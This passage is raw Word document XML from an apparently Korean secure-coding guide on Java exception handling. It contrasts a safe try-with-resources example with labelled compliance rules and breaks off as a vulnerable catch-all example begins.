              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>오류</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>누락</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>운영</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>장애로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어집니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] try-with-resources</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>및</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자원</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해제</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>try (FileInputStream fis = new FileInputStream("config.properties")) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    properties.load(fis);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>} catch (FileNotFoundException e) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>log.error("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>", e);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>throw new RuntimeException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>찾을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>.");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00D928A8" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>부적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예외</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>처리</w:t>
      </w:r>
      <w:r w:rsidR="00D928A8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D928A8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>장애</w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>회피를</w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위한</w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예외</w:t>
      </w:r>
      <w:r w:rsidR="00064ED4">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>처리</w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001301B8">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>금지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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환값이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있는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모든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함수의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결과값을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검사한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>광범위한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예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(Exception) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>단일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> catch </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대신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구체적인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예외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유형별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처리를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수행한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>하나로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>묶어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무시</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>try {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
